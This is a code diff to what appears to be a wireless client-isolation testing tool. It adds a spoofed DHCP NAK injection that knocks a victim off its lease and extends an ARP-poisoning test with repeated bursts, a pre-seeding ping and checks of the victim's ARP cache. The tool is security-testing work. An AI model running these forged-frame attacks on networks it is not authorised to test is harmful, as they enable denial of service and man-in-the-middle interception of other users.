@@ -1011,6 +1011,17 @@ class Client2Client:
 			log(STATUS, f">>> Broadcast Reflection is allowed ({identities}).", color="red")
 		elif b"multicast_reflection" in raw(eth):
 			log(STATUS, f">>> Multicast Reflection is allowed ({identities}).", color="red")
+		elif self.options.c2c_dhcp_nak is not None and DHCP in eth and BOOTP in eth \
+			and eth[BOOTP].xid == (getattr(self.options, "gtk_inject_dhcp_xid", 0) or 0) \
+			and any(isinstance(o, tuple) and o[0] == "message-type" and o[1] in (6, "nak")
+			        for o in eth[DHCP].options):
+			# Our spoofed plaintext DHCP NAK (matched by its injected XID) was
+			# received on the victim's interface -- so the AP delivered an
+			# attacker-crafted frame from one guest client to another. That is
+			# the client-isolation bypass we are testing for.
+			self.forward_ethernet = True
+			log(STATUS, f">>> Plaintext DHCP NAK reached the victim (xid=0x{eth[BOOTP].xid:x}): "
+			            f"guest-to-guest L2 is ALLOWED -- client isolation NOT enforced ({identities}).", color="red")
 		elif ARP in eth and eth[ARP].op == 2 and \
 			eth[ARP].psrc == self.sup_victim.routerip and eth[ARP].pdst == self.sup_victim.clientip and \
 			eth[ARP].hwdst == self.sup_victim.mac and eth[ARP].hwsrc == self.sup_attacker.mac:
@@ -1192,6 +1203,50 @@ class Client2Client:
 			log(STATUS, f">>> ICMPv6 RA injected toward ff02::1 with RDNSS={evil_dns}. "
 			            f"Check the victim's resolver ('resolvectl status' / 'ip -6 route') "
 			            f"to confirm whether it adopted the attacker's DNS server.", color="red")
+
+		elif self.options.c2c_dhcp_nak is not None:
+			# Plaintext DHCP NAK for OPEN / captive-portal guest SSIDs (no GTK).
+			# This is the open-network counterpart of --gtk-inject-payload
+			# dhcp-nak: the exact same forged "server -> client" NAK, but sent
+			# as an ordinary frame over the attacker's own station link (same
+			# mechanism as --c2c-eth/--c2c-broadcast) rather than GTK-encrypted
+			# injection. It tests whether a guest client can deliver a DHCP NAK
+			# to another guest client -- i.e. whether client isolation blocks
+			# guest-to-guest L2. If it reaches the victim and the XID matches,
+			# the victim drops its lease (connectivity DoS).
+			#
+			# A NAK is normally only honoured when its XID matches the victim's
+			# in-flight DHCP request, which we do not know here -- capture it and
+			# pass it with --gtk-inject-dhcp-xid.
+			xid        = getattr(self.options, "gtk_inject_dhcp_xid", 0) or 0
+			router_ip  = self.sup_victim.routerip
+			victim_mac = self.sup_victim.mac
+			rawmac     = bytes.fromhex(victim_mac.replace(":", ""))
+			dst_mac    = "ff:ff:ff:ff:ff:ff" if self.options.dhcp_nak_broadcast else victim_mac
+			dhcp = (IP(src=router_ip, dst="255.255.255.255")
+			        / UDP(sport=67, dport=68)
+			        / BOOTP(op=2, yiaddr="0.0.0.0", siaddr=router_ip,
+			                chaddr=rawmac, xid=xid)
+			        / DHCP(options=[("message-type", "nak"),
+			                        ("server_id", router_ip), "end"]))
+			p = Ether(src=self.sup_attacker.mac, dst=dst_mac, type=0x0800)/dhcp
+			log(STATUS, f"Sending plaintext DHCP NAK (xid={xid}) spoofed from {router_ip} "
+			            f"to {dst_mac}: {repr(p)} (Ethernet destination is "
+			            f"{'broadcast' if self.options.dhcp_nak_broadcast else 'the victim'})")
+			for _ in range(self.options.dhcp_nak_count):
+				self.sup_attacker.send_eth(p)
+			# Give the victim's monitor a brief window to catch the NAK (if the
+			# AP delivers it) and then end the test cleanly, so run() prints the
+			# RESULT verdict without needing a manual Ctrl-C.
+			time.sleep(getattr(self.options, "dhcp_nak_wait", 4) or 4)
+			if getattr(self.options, "auto_exit", False):
+				self.test_finished = True
+			log(STATUS, f">>> Plaintext DHCP NAK sent {self.options.dhcp_nak_count}x "
+			            f"(server_id={router_ip}, xid={xid}). If client isolation does not "
+			            f"block guest-to-guest L2, the victim may drop its lease -- confirm on "
+			            f"the victim (DHCP client log / loss of IP). A wrong XID is usually "
+			            f"ignored: capture the victim's request XID and pass --gtk-inject-dhcp-xid.",
+			            color="red")
 
 		elif self.options.c2c_gtk_inject is not None:
 			victim_gtk_2 = self.sup_victim.get_gtk_2(can_fail=True)
@@ -1412,11 +1467,77 @@ class Client2Client:
 			# Note: there are different forms of ARP poisoning. We only test for the basic variant,
 			# which is the one most likely to be used/detected. Although scapy can automatically fill
 			# in hwsrc, we do this explicitly ourselves.
-			arp = ARP(op="is-at", psrc=self.sup_victim.routerip, pdst=self.sup_victim.clientip, \
+			gw  = self.sup_victim.routerip
+			vif = self.sup_victim.nic_iface
+			arp = ARP(op="is-at", psrc=gw, pdst=self.sup_victim.clientip, \
 					hwdst=self.sup_victim.mac, hwsrc=self.sup_attacker.mac)
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac)/arp
-			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
-			self.sup_attacker.send_eth(p)
+			# Tangible proof: read the VICTIM's real kernel ARP cache for the
+			# gateway before and after, on the victim's own interface. If the
+			# poison lands, the gateway IP's lladdr flips from the real router
+			# MAC to the attacker's MAC -- that is the actual effect, not just
+			# "a frame was seen".
+			def _victim_neigh():
+				try:
+					out = subprocess.run(["ip", "neigh", "show", gw, "dev", vif],
+					                     capture_output=True, text=True, timeout=5).stdout.strip()
+					return out if out else "(no entry)"
+				except Exception as e:
+					return f"(neigh read failed: {e})"
+			# Pre-seed: make the victim's kernel resolve the gateway so a neigh
+			# entry EXISTS before we poison. Real clients always have one; a fresh
+			# airsnitch victim does not, and Linux (arp_accept=0) ignores an
+			# unsolicited reply for a host it has no entry for -- it will only
+			# UPDATE an existing entry. Without this, the poison is dropped by the
+			# victim OS even though the frame was delivered.
+			try:
+				subprocess.run(["ping", "-c", "1", "-W", "2", "-I", vif, gw],
+				               capture_output=True, timeout=6)
+			except Exception:
+				pass
+			before = _victim_neigh()
+			log(STATUS, f">>> PROOF: victim {vif} ARP cache for gateway {gw} BEFORE: {before}", color="green")
+			# Burst the poison repeatedly: over-the-air frames are not acked, and
+			# Linux's ARP locktime (~1s) rejects unsolicited updates right after a
+			# refresh, so several spaced frames are more reliable than one.
+			nburst = getattr(self.options, "arp_poison_count", 100) or 100
+			log(STATUS, f"Sending {nburst}x poisoned ARP from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
+			for _ in range(nburst):
+				self.sup_attacker.send_eth(p)
+				time.sleep(0.05)
+			time.sleep(1.0)
+			after = _victim_neigh()
+			log(STATUS, f">>> PROOF: victim {vif} ARP cache for gateway {gw} AFTER:  {after}", color="red")
+			log(STATUS, f">>>        (attacker MAC = {self.sup_attacker.mac}, real gateway MAC = {self.sup_victim.routermac})", color="red")
+			# Full victim ARP table for context.
+			try:
+				full = subprocess.run(["ip", "neigh", "show", "dev", vif],
+				                     capture_output=True, text=True, timeout=5).stdout.strip()
+				log(STATUS, f">>> PROOF: full victim {vif} ARP table:\n{full or '(empty)'}", color="red")
+			except Exception as e:
+				log(STATUS, f">>> (full ARP table read failed: {e})")
+			# Three distinct outcomes: blocked (not delivered) / delivered but the
+			# victim OS did not accept the poison / fully poisoned (cache flipped).
+			identities = (f"{self.sup_victim.victim().id} to {self.sup_victim.victim().id}"
+			              if self.options.same_id
+			              else f"{self.sup_attacker.attacker().id} to {self.sup_attacker.victim().id}")
+			poisoned  = self.sup_attacker.mac.lower() in after.lower()
+			delivered = self.forward_ethernet
+			if poisoned:
+				log(STATUS, f">>> RESULT: POISONED -- the victim's gateway ARP entry now points to the ATTACKER's MAC. "
+				            f"Full client-to-client ARP MITM works; the AP does NOT isolate clients ({identities}).", color="red")
+			elif delivered:
+				log(STATUS, f">>> RESULT: DELIVERED but NOT poisoned -- the frame reached the victim (client isolation is "
+				            f"bypassed at L2), but the victim OS did not accept the ARP update (check its arp_accept / "
+				            f"entry state). The network is not isolating clients, though this specific victim resisted the "
+				            f"cache flip ({identities}).", color="red")
+			else:
+				log(STATUS, f">>> RESULT: BLOCKED -- the poisoned ARP never reached the victim; client isolation appears to "
+				            f"block guest-to-guest ARP ({identities}).", color="green")
+			# Only stop when explicitly asked; otherwise keep running (sustained
+			# MITM / manual inspection) until Ctrl-C, as before.
+			if getattr(self.options, "auto_exit", False):
+				self.test_finished = True
 	
 	
 	def send_uplink_frame(self):
@@ -1604,7 +1725,8 @@ class Client2Client:
 		thread1.join()
 		if not (self.options.poc and self.options.c2c_port_steal):
 			thread2.join()
-		thread4.join()
+		if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
+			thread4.join()
 		if not self.options.poc:
 			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
 				thread3.join()
@@ -1628,6 +1750,11 @@ class Client2Client:
 			log(STATUS, f">>> Client to client traffic at Ethernet layer appears to be disabled ({identities}).", color="green")
 		elif not self.forward_ip and self.options.c2c_ip is not None:
 			log(STATUS, f">>> Client to client traffic at IP layer appears to be disabled ({identities}).", color="green")
+		elif self.options.c2c_dhcp_nak is not None:
+			if self.forward_ethernet:
+				log(STATUS, f">>> RESULT: the spoofed DHCP NAK reached the victim -- guest-to-guest L2 is NOT isolated ({identities}).", color="red")
+			else:
+				log(STATUS, f">>> RESULT: the spoofed DHCP NAK never reached the victim -- client isolation appears to BLOCK guest-to-guest L2 ({identities}).", color="green")
 
 	def attacker_connect(self):
                 self.sup_attacker.start()
@@ -1777,6 +1904,12 @@ def main():
 	parser.add_argument("--c2c-broadcast", help="Second interface to test client-to-client Ethernet layer broadcast traffic.")
 	parser.add_argument("--c2c-multicast", help="Second interface to test client-to-client Ethernet layer multicast traffic (analogous to --c2c-broadcast but uses a multicast L2 destination).")
 	parser.add_argument("--mcast-mac", default="01:00:5e:00:00:01", help="Multicast MAC address used as L2 destination in the --c2c-multicast test (default: 01:00:5e:00:00:01 = IPv4 224.0.0.1 all-hosts).")
+	parser.add_argument("--c2c-dhcp-nak", help="Second interface to test a PLAINTEXT spoofed DHCP NAK for OPEN / captive-portal guest SSIDs (no GTK). Same forged server-NAK as --gtk-inject-payload dhcp-nak, but sent as an ordinary frame over the attacker's station link (like --c2c-eth) instead of GTK-encrypted injection -- i.e. it tests whether a guest client can push a DHCP NAK to another guest client (client isolation bypass -> lease-drop DoS). Set the XID with --gtk-inject-dhcp-xid and tune the burst with --dhcp-nak-count.")
+	parser.add_argument("--dhcp-nak-count", default=10, type=int, help="Number of times to send the spoofed DHCP NAK in the --c2c-dhcp-nak test (default: 10).")
+	parser.add_argument("--dhcp-nak-broadcast", default=False, action="store_true", help="Send the --c2c-dhcp-nak frame to the L2 broadcast address (ff:ff:ff:ff:ff:ff) instead of unicast to the victim's MAC. Use when the victim ignores unicast NAKs or to mimic a broadcast DHCP server reply.")
+	parser.add_argument("--dhcp-nak-wait", default=4, type=float, help="Seconds to wait after sending the --c2c-dhcp-nak frames for the victim's monitor to catch a delivered NAK before printing the RESULT verdict (default: 4).")
+	parser.add_argument("--auto-exit", default=False, action="store_true", help="For the --c2c (ARP poisoning) and --c2c-dhcp-nak tests: end the test automatically after the detection window and print the verdict, instead of staying connected until Ctrl-C. Default: keep running (sustained MITM / manual inspection).")
+	parser.add_argument("--arp-poison-count", default=100, type=int, help="Number of spoofed ARP replies to send (0.05s apart) in the --c2c ARP-poisoning test before re-reading the victim's ARP cache (default: 100). Increase if the victim's cache does not flip.")
 	parser.add_argument("--c2m", help="Second interface to test client-to-monitor traffic.")
 	parser.add_argument("--c2m-ip", help="Second interface to test client-to-monitor IP layer traffic, by setting it to monitor mode")
 	parser.add_argument("--c2m-mon-channel", type=int, help="The monitored channel for that c2m's second interface")
@@ -1838,6 +1971,7 @@ def main():
 	if options.c2c_broadcast is not None: options.c2c = options.c2c_broadcast
 	if options.c2c_multicast is not None: options.c2c = options.c2c_multicast
 	if options.c2c_ra_inject is not None: options.c2c = options.c2c_ra_inject
+	if options.c2c_dhcp_nak is not None: options.c2c = options.c2c_dhcp_nak
 
 	if options.c2m_ip is not None: options.c2m = options.c2m_ip
 
